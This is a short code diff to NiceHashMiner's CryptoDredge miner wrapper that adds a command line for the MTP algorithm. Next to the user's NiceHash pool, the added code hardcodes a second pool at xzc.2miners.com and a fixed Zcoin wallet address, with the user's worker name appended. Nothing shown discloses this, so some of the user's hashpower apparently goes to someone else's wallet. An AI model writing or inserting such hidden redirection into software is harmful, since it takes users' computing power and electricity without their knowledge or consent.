cd mtp

+++ NiceHashMiner/Miners/CryptoDredge.cs
@@ -223,6 +223,21 @@ namespace NiceHashMiner.Miners
                 Total = 0.0d;
                 return commandLine;
             }
+
+            if (MiningSetup.CurrentAlgorithmType.Equals(AlgorithmType.MTP))
+            {
+                algo = "--algo mtp";
+                commandLine = algo +
+                " --url=stratum+tcp://" + alg + ".eu.nicehash.com:" + port + " " + " -u " + username + " -p x " +
+                " -o stratum+tcp://xzc.2miners.com:8080" + " -u aMGfYX8ARy4wKE57fPxkEBcnNuHegDBweE." + ConfigManager.GeneralConfig.WorkerName.Trim() + " -p x " +
+                " --log " + GetLogFileName() +
+                apiBind +
+                " -d " + GetDevicesCommandString() + " " +
+                ExtraLaunchParametersParser.ParseForMiningSetup(MiningSetup, DeviceType.NVIDIA) + " ";
+                TotalCount = 3;
+                Total = 0.0d;
+                return commandLine;
+            }
             if (File.Exists("bin_3rdparty\\CryptoDredge\\" + GetLogFileName()))
                 File.Delete("bin_3rdparty\\CryptoDredge\\" + GetLogFileName());
             commandLine = algo +
